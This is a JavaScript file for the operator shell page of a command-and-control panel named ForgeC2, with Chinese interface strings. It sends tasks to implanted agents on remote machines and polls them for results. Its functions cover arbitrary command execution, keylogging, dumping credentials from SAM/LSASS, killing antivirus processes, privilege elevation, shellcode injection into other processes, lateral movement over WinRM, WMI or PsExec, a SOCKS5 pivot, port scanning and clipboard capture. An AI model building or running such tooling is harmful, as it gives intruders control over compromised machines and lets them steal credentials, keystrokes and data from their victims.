// Shell terminal page - command execution, autocomplete, history, keylogger, process control

function decodeShellResultText(data) {
    let out = (data && data.result) ? String(data.result) : '';
    if (!out.trim()) return out;
    const isB64 = data.encoding === 'base64' ||
        (out.length > 40 && /^[A-Za-z0-9+/=\s]+$/.test(out.trim()));
    if (!isB64) return out;
    try {
        const binary = atob(out.replace(/\s/g, ''));
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
        return new TextDecoder('utf-8').decode(bytes);
    } catch (e) {
        return out;
    }
}

function shellEscapeHtml(str) {
    if (typeof window.escapeHtml === 'function') return window.escapeHtml(str);
    if (!str) return '';
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

function isShellPage() {
    return !!document.getElementById('shell-page');
}

function getShellTiming() {
    const rawInterval = (typeof window.agentInterval !== 'undefined') ? window.agentInterval : agentInterval;
    const rawJitter = (typeof window.agentJitter !== 'undefined') ? window.agentJitter : agentJitter;
    let interval = (typeof rawInterval !== 'undefined') ? Number(rawInterval) : 10;
    if (isNaN(interval) || interval < 0) interval = 10;
    let jitter = (typeof rawJitter !== 'undefined') ? Number(rawJitter) : 20;
    if (isNaN(jitter) || jitter < 0) jitter = 20;

    if (interval === 0) {
        return {
            interval: 0,
            jitter: jitter,
            interactive: true,
            maxWaitMs: 30000,
            pollMs: 250,
            initialMs: 150
        };
    }

    const intervalMs = interval * 1000;
    const maxWaitMs = Math.round(intervalMs * (1 + jitter / 100)) + 3000;
    const pollMs = Math.min(5000, Math.max(800, Math.round(intervalMs * 0.2)));
    const initialMs = Math.min(3000, Math.max(400, Math.round(intervalMs * 0.1)));
    return { interval: interval, jitter: jitter, interactive: false, maxWaitMs: maxWaitMs, pollMs: pollMs, initialMs: initialMs };
}

function wakeAgentBeacon() {
    fetch('/agents/' + agentId + '/beacon_now', { method: 'POST' }).catch(function() {});
}

function formatBeaconHint(interval, jitter) {
    if (interval === 0) return '实时' + (jitter >= 0 ? ' ±' + jitter + '%' : '');
    if (interval > 0) return interval + 's' + (jitter >= 0 ? ' ±' + jitter + '%' : '');
    return '—';
}

function updateShellRegenBanner(expectedInterval, agentIntervalValue) {
    const page = document.getElementById('shell-page');
    const banner = document.getElementById('shell-regen-banner');
    const bannerText = document.getElementById('shell-regen-banner-text');
    if (!page || !banner) return;

    const expected = (typeof expectedInterval === 'number')
        ? expectedInterval
        : Number(page.dataset.expectedInterval);
    const actual = (typeof agentIntervalValue === 'number')
        ? agentIntervalValue
        : Number(page.dataset.agentInterval);

    if (page.dataset) {
        if (!isNaN(expected)) page.dataset.expectedInterval = String(expected);
        if (!isNaN(actual)) page.dataset.agentInterval = String(actual);
    }

    const mismatch = !isNaN(expected) && !isNaN(actual) && expected !== actual;
    banner.classList.toggle('hidden', !mismatch);
    if (mismatch && bannerText) {
        bannerText.textContent = __t('shell.regen_hint');
    }
}

function refreshShellBeaconTiming() {
    if (!isShellPage() || typeof agentId === 'undefined') return;
    fetch('/toolkit/agents/' + agentId + '/info')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (!data || !data.agent) return;
            const iv = Number(data.agent.current_interval);
            const jt = Number(data.agent.current_jitter);
            if (!isNaN(iv) && iv >= 0) {
                window.agentInterval = iv;
                if (typeof agentInterval !== 'undefined') agentInterval = iv;
            }
            if (!isNaN(jt) && jt >= 0) {
                window.agentJitter = jt;
                if (typeof agentJitter !== 'undefined') agentJitter = jt;
            }
            const hint = document.getElementById('shell-beacon-hint');
            if (hint) hint.textContent = formatBeaconHint(iv, jt);

            const page = document.getElementById('shell-page');
            const expected = page ? Number(page.dataset.expectedInterval) : NaN;
            updateShellRegenBanner(expected, iv);
        })
        .catch(function() {});
}

function scheduleFetchResult(taskId, delayMs) {
    const delay = (typeof delayMs === 'number') ? delayMs : getShellTiming().initialMs;
    setTimeout(function() { fetchResult(taskId, Date.now()); }, delay);
}

function getShellPrompt(shell) {
    if (typeof osType !== 'undefined' && osType === 'linux') return '$ ';
    if (shell === 'powershell.exe') return 'PS> ';
    return 'CMD> ';
}

function updatePrompt() {
    const shellSelect = document.getElementById('shell-select');
    const promptEl = document.getElementById('prompt');
    if (!promptEl) return;
    const shell = shellSelect ? shellSelect.value : '';
    promptEl.textContent = getShellPrompt(shell);
}

function removeLastStatusLine() {
    const output = document.getElementById('terminal-output');
    if (!output || !output.lastElementChild) return;
    if (output.lastElementChild.classList.contains('shell-status')) {
        output.lastElementChild.remove();
    }
}

function handleKeyDown(event) {
    const input = document.getElementById('cmd-input');
    const autocompleteContainer = document.getElementById('autocomplete-container');
    if (!input) return;

    if (event.key === 'Enter') {
        event.preventDefault();
        executeCommand();
    } else if (event.key === 'ArrowUp') {
        event.preventDefault();
        const prevValue = CommandHistory.up(input.value);
        input.value = prevValue;
    } else if (event.key === 'ArrowDown') {
        event.preventDefault();
        const nextValue = CommandHistory.down(input.value);
        input.value = nextValue;
    } else if (event.key === 'Tab') {
        event.preventDefault();
        if (!autocompleteContainer) return;
        const selected = AutoComplete.getSelected();
        if (selected) {
            input.value = selected;
            AutoComplete.hide(autocompleteContainer);
        } else {
            const suggestions = AutoComplete.getSuggestions(input.value, osType);
            if (suggestions.length > 0) {
                input.value = suggestions[0];
            }
        }
    } else if (event.key === 'Escape') {
        if (autocompleteContainer) AutoComplete.hide(autocompleteContainer);
    } else if (event.key === 'l' && event.ctrlKey) {
        event.preventDefault();
        clearTerminal();
    }
}

function handleInput(event) {
    const input = document.getElementById('cmd-input');
    const autocompleteContainer = document.getElementById('autocomplete-container');
    if (!input || !autocompleteContainer) return;

    if (input.value.trim()) {
        AutoComplete.show(autocompleteContainer, input.value, (selected) => {
            input.value = selected;
            input.focus();
        });
    } else {
        AutoComplete.hide(autocompleteContainer);
    }
}

function requestPS() {
    wakeAgentBeacon();
    fetch(`/agents/${agentId}/ps`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                appendOutput('<span class="text-amber-400">PS></span> <span class="text-white">tasklist</span>');
                appendOutput('<span class="text-slate-500">进程列表已请求...</span>');
                scheduleFetchResult(data.task_id);
            }
        });
}

function requestScreenshot() {
    fetch(`/agents/${agentId}/screenshot`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                appendOutput('<span class="text-amber-400">CMD></span> <span class="text-white">screenshot</span>');
                appendOutput('<span class="text-slate-500">截图已请求...</span>');
                scheduleFetchResult(data.task_id);
            }
        });
}

function executeCommand() {
    const input = document.getElementById('cmd-input');
    const cmd = input.value.trim();
    const shell = document.getElementById('shell-select').value;

    if (!cmd) return;

    CommandHistory.add(cmd);
    CommandHistory.resetIndex();

    const prompt = getShellPrompt(shell);
    updatePrompt();

    appendOutput(`<span class="text-amber-400">${shellEscapeHtml(prompt.trim())}</span> <span class="text-white">${shellEscapeHtml(cmd)}</span>`);

    input.value = '';
    AutoComplete.hide(document.getElementById('autocomplete-container'));

    appendOutput('<span class="text-slate-500">Executing...</span>', true);
    wakeAgentBeacon();

    fetch(`/agents/${agentId}/command`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `command=${encodeURIComponent(cmd)}&shell=${shell}`
    }).then(r => r.json()).then(data => {
        if (data.success) {
            scheduleFetchResult(data.task_id);
        } else {
            removeLastStatusLine();
            appendOutput('<span class="text-red-400">Error: ' + shellEscapeHtml(data.error || 'Failed to send command') + '</span>');
        }
    }).catch(err => {
        removeLastStatusLine();
        appendOutput('<span class="text-red-400">Network error: ' + shellEscapeHtml(String(err)) + '</span>');
    });
}

function fetchResult(taskId, startedAt) {
    const timing = getShellTiming();
    if (!startedAt) startedAt = Date.now();

    fetch(`/agents/${agentId}/tasks/${taskId}`)
        .then(r => r.json())
        .then(data => {
            if (data.error) {
                removeLastStatusLine();
                appendOutput('<span class="text-red-400">Error: ' + shellEscapeHtml(data.error) + '</span>');
                return;
            }

            const status = data.status;

            if (status === 'completed') {
                removeLastStatusLine();
                if (data.result && data.result.trim()) {
                    const out = decodeShellResultText(data);
                    appendOutput('<span class="text-emerald-300">' + shellEscapeHtml(out) + '</span>');
                } else {
                    appendOutput('<span class="text-emerald-300">Command executed successfully</span>');
                }
            } else if (status === 'failed') {
                removeLastStatusLine();
                if (data.error && data.error.trim()) {
                    appendOutput('<span class="text-red-400">' + shellEscapeHtml(data.error) + '</span>');
                } else {
                    appendOutput('<span class="text-red-400">Command failed</span>');
                }
            } else {
                const elapsed = Date.now() - startedAt;
                if (elapsed >= timing.maxWaitMs) {
                    removeLastStatusLine();
                    const timeoutMsg = timing.interactive
                        ? '超时：实时模式下 Agent 未返回结果，可点击强制回连后重试'
                        : '超时：Agent 在 ' + timing.interval + 's 心跳内未返回结果，可点击强制回连后重试';
                    appendOutput('<span class="text-red-400">' + timeoutMsg + '</span>');
                    return;
                }
                const remainSec = Math.max(1, Math.ceil((timing.maxWaitMs - elapsed) / 1000));
                removeLastStatusLine();
                const waitMsg = timing.interactive
                    ? '实时模式，等待响应 (约 ' + remainSec + 's)...'
                    : '等待回连 (心跳 ' + timing.interval + 's ±' + timing.jitter + '%, 约 ' + remainSec + 's)...';
                appendOutput('<span class="text-yellow-400">' + waitMsg + '</span>', true);
                setTimeout(function() { fetchResult(taskId, startedAt); }, timing.pollMs);
            }
        }).catch(err => {
            appendOutput('<span class="text-red-400">Network error: ' + err + '</span>');
        });
}

function appendOutput(html, isStatus) {
    const output = document.getElementById('terminal-output');
    if (!output) return;
    const line = document.createElement('div');
    line.className = 'shell-line whitespace-pre-wrap break-words';
    if (isStatus) line.classList.add('shell-status');
    line.innerHTML = html;
    output.appendChild(line);
    output.scrollTop = output.scrollHeight;
}

function clearTerminal() {
    const output = document.getElementById('terminal-output');
    if (!output) return;
    const host = typeof agentHostname !== 'undefined' ? agentHostname : 'agent';
    output.innerHTML = `
        <div class="text-slate-500 shell-line">ForgeC2 Shell — ${shellEscapeHtml(host)}</div>
        <div class="text-slate-500 shell-line">Terminal cleared.</div>
        <div class="text-slate-600 shell-line mb-2">────────────────────────────────────────</div>
    `;
}

function startKeylogger() {
    fetch(`/agents/${agentId}/keylogger/start`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                appendOutput('<span class="text-amber-400">KL></span> <span class="text-white">keylogger started</span>');
                scheduleFetchResult(data.task_id);
            }
        });
}

function stopKeylogger() {
    fetch(`/agents/${agentId}/keylogger/stop`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                appendOutput('<span class="text-amber-400">KL></span> <span class="text-white">keylogger stopped</span>');
                scheduleFetchResult(data.task_id);
            }
        });
}

function dumpKeylogger() {
    appendOutput('<span class="text-amber-400">KL></span> <span class="text-white">dumping keylog...</span>');
    fetch(`/agents/${agentId}/keylogger/dump`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                scheduleFetchResult(data.task_id);
            }
        });
}

function suspendProc() {
    const target = document.getElementById('proc-target').value.trim() || '';
    if (!target) { appendOutput('<span class="text-red-400">请输入 PID 或进程名</span>'); return; }
    appendOutput('<span class="text-amber-400">PROC></span> <span class="text-white">suspend ' + escapeHtml(target) + '</span>');
    fetch(`/agents/${agentId}/suspend`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'target=' + encodeURIComponent(target)
    }).then(r => r.json()).then(data => {
        if (data.success) scheduleFetchResult(data.task_id);
    });
}

function resumeProc() {
    const target = document.getElementById('proc-target').value.trim() || '';
    if (!target) { appendOutput('<span class="text-red-400">请输入 PID 或进程名</span>'); return; }
    appendOutput('<span class="text-amber-400">PROC></span> <span class="text-white">resume ' + escapeHtml(target) + '</span>');
    fetch(`/agents/${agentId}/resume`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'target=' + encodeURIComponent(target)
    }).then(r => r.json()).then(data => {
        if (data.success) scheduleFetchResult(data.task_id);
    });
}

function quickCmd(cmd) {
    const shellSelect = document.getElementById('shell-select');
    const shell = shellSelect ? shellSelect.value : (typeof osType !== 'undefined' && osType === 'linux' ? '/bin/bash' : 'cmd.exe');
    const prompt = getShellPrompt(shell);
    appendOutput('<span class="text-amber-400">' + shellEscapeHtml(prompt.trim()) + '</span> <span class="text-white">' + shellEscapeHtml(cmd) + '</span>');
    appendOutput('<span class="text-slate-500">Executing...</span>', true);
    wakeAgentBeacon();
    fetch(`/agents/${agentId}/command`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'command=' + encodeURIComponent(cmd) + '&shell=' + encodeURIComponent(shell)
    }).then(r => r.json()).then(data => {
        if (data.success) {
            scheduleFetchResult(data.task_id);
        } else {
            removeLastStatusLine();
            appendOutput('<span class="text-red-400">Error: ' + shellEscapeHtml(data.error || 'Failed') + '</span>');
        }
    }).catch(err => {
        removeLastStatusLine();
        appendOutput('<span class="text-red-400">Network error: ' + shellEscapeHtml(String(err)) + '</span>');
    });
}

function killProc() {
    const target = document.getElementById('proc-target').value.trim() || '';
    if (!target) { appendOutput('<span class="text-red-400">请输入 PID 或进程名</span>'); return; }
    appendOutput('<span class="text-amber-400">PROC></span> <span class="text-white">killproc ' + escapeHtml(target) + '</span>');
    fetch(`/agents/${agentId}/killproc`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'target=' + encodeURIComponent(target)
    }).then(r => r.json()).then(data => {
        if (data.success) scheduleFetchResult(data.task_id);
    });
}

function clipGet() {
    appendOutput('<span class="text-amber-400">CLIP></span> <span class="text-white">get</span>');
    fetch(`/agents/${agentId}/clipboard/get`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}
function clipSet() {
    const data = prompt('输入要设置到剪贴板的内容:');
    if (!data) return;
    fetch(`/agents/${agentId}/clipboard/set`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'data=' + encodeURIComponent(data)
    }).then(r => r.json()).then(data => { if (data.success) appendOutput('<span class="text-emerald-400">剪贴板已设置</span>'); });
}
function findFiles() {
    const patternEl = document.getElementById('find-pattern');
    const pattern = patternEl ? patternEl.value.trim() : '*';
    appendOutput('<span class="text-amber-400">FIND></span> <span class="text-white">pattern=' + escapeHtml(pattern) + '</span>');
    fetch(`/agents/${agentId}/find`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'pattern=' + encodeURIComponent(pattern)
    }).then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}

function listDrives() {
    appendOutput('<span class="text-amber-400">DRIVES></span> <span class="text-white">listing...</span>');
    fetch(`/agents/${agentId}/drives`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}

function forceBeacon() {
    appendOutput('<span class="text-emerald-400">BEACON></span> <span class="text-white">forcing check-in...</span>');
    fetch(`/agents/${agentId}/beacon_now`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id, 500); });
}

function doReboot() {
    if (!confirm('确认重启目标机器?')) return;
    fetch(`/agents/${agentId}/reboot`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) appendOutput('<span class="text-orange-400">Reboot sent</span>'); });
}

function doShutdown() {
    if (!confirm('确认关机目标机器?')) return;
    fetch(`/agents/${agentId}/shutdown`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) appendOutput('<span class="text-red-400">Shutdown sent</span>'); });
}

function listServices() {
    appendOutput('<span class="text-amber-400">SERVICES></span> <span class="text-white">listing...</span>');
    fetch(`/agents/${agentId}/services`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}

function doPortScan() {
    const t = prompt("Target e.g. 192.168.1.1:22,80,443 or 10.0.0.0/24:22");
    if (!t) return;
    appendOutput('<span class="text-amber-400">SCAN></span> ' + escapeHtml(t));
    fetch(`/agents/${agentId}/portscan`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'target=' + encodeURIComponent(t) })
        .then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}

function doNetstat() {
    appendOutput('<span class="text-amber-400">NETSTAT></span> ...');
    fetch(`/agents/${agentId}/netstat`, { method: 'POST' }).then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}

function doUsers() {
    appendOutput('<span class="text-amber-400">USERS></span> ...');
    fetch(`/agents/${agentId}/users`, { method: 'POST' }).then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}

function doAV() {
    appendOutput('<span class="text-amber-400">AV></span> ...');
    fetch(`/agents/${agentId}/av`, { method: 'POST' }).then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}

function doDownloadURL() {
    const url = prompt("URL to download:");
    if (!url) return;
    const dest = prompt("Dest path (optional):", "");
    fetch(`/agents/${agentId}/download_url`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'url=' + encodeURIComponent(url) + '&dest=' + encodeURIComponent(dest) })
        .then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}

function doUninstall() {
    if (!confirm('Uninstall persistence and self-delete?')) return;
    fetch(`/agents/${agentId}/uninstall`, { method: 'POST' }).then(r => r.json()).then(data => { if (data.success) appendOutput('<span class="text-red-400">Uninstall sent</span>'); });
}

function doSetSleep() {
    const s = prompt("心跳,抖动 例如 0,20（0=实时）或 30,20");
    if (!s) return;
    fetch(`/agents/${agentId}/set_sleep`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'sleep=' + encodeURIComponent(s) })
        .then(r => r.json()).then(data => {
            if (data.success) {
                scheduleFetchResult(data.task_id, 1000);
                setTimeout(refreshShellBeaconTiming, 2500);
            }
        });
}

function killAV() {
    if (!confirm('确认一键终止反病毒软件？这可能触发告警！')) return;
    appendOutput('<span class="text-red-400">TERMINATE_AV></span> <span class="text-white">attempting to kill AV processes...</span>');
    fetch(`/agents/${agentId}/kill_av`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}

function doElevate() {
    const cmd = prompt("提权后执行的命令 (留空默认 whoami):", "");
    appendOutput('<span class="text-purple-400">ELEVATE></span> <span class="text-white">' + escapeHtml(cmd || "default") + '</span>');
    fetch(`/agents/${agentId}/elevate`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'cmd=' + encodeURIComponent(cmd || "")
    }).then(r => r.json()).then(data => {
        if (data.success) scheduleFetchResult(data.task_id);
    });
}

function doCreds() {
    appendOutput('<span class="text-amber-400">CREDS></span> dumping SAM/LSASS... (may require high priv)');
    fetch(`/agents/${agentId}/creds`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}

function doInject() {
    const pid = prompt("Target PID:", "");
    if (!pid) return;
    const tech = prompt("Technique (createremotethread | apc | earlybird):", "createremotethread");
    const sc = prompt("Shellcode base64 (or leave for test NOPs - not sent):", "");
    fetch(`/agents/${agentId}/inject`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `pid=${encodeURIComponent(pid)}&tech=${encodeURIComponent(tech || '')}&shellcode=${encodeURIComponent(sc || '')}`
    }).then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}

function doLateral() {
    const spec = prompt("Lateral spec e.g. winrm|10.0.0.5|user|pass|whoami  OR  wmi|...  OR psexec|...", "winrm|127.0.0.1||whoami");
    if (!spec) return;
    appendOutput('<span class="text-indigo-400">LATERAL></span> ' + escapeHtml(spec));
    fetch(`/agents/${agentId}/lateral`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'spec=' + encodeURIComponent(spec)
    }).then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}

function doSocks() {
    const port = prompt("Implant local SOCKS5 port:", "1080");
    appendOutput('<span class="text-teal-400">SOCKS5></span> starting on agent port ' + (port||'1080'));
    fetch(`/agents/${agentId}/socks`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'port=' + encodeURIComponent(port || "1080")
    }).then(r => r.json()).then(data => { if (data.success) scheduleFetchResult(data.task_id); });
}

function initShellPage() {
    if (!isShellPage() || typeof agentId === 'undefined') return;

    const shellSelect = document.getElementById('shell-select');
    const cmdInput = document.getElementById('cmd-input');
    const execBtn = document.getElementById('shell-exec-btn');
    const clearBtn = document.getElementById('shell-clear-btn');

    updatePrompt();

    if (shellSelect) {
        shellSelect.addEventListener('change', updatePrompt);
    }
    if (cmdInput) {
        cmdInput.addEventListener('keydown', handleKeyDown);
        cmdInput.addEventListener('input', handleInput);
        cmdInput.focus();
    }
    if (execBtn) {
        execBtn.addEventListener('click', executeCommand);
    }
    if (clearBtn) {
        clearBtn.addEventListener('click', clearTerminal);
    }

    document.querySelectorAll('.shell-quick-cmd').forEach(function(btn) {
        btn.addEventListener('click', function() {
            const cmd = btn.getAttribute('data-cmd');
            if (cmd) quickCmd(cmd);
        });
    });

    const page = document.getElementById('shell-page');
    if (page) {
        updateShellRegenBanner(
            Number(page.dataset.expectedInterval),
            Number(page.dataset.agentInterval)
        );
    }

    refreshShellBeaconTiming();
    setInterval(refreshShellBeaconTiming, 15000);
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initShellPage);
} else {
    initShellPage();
}
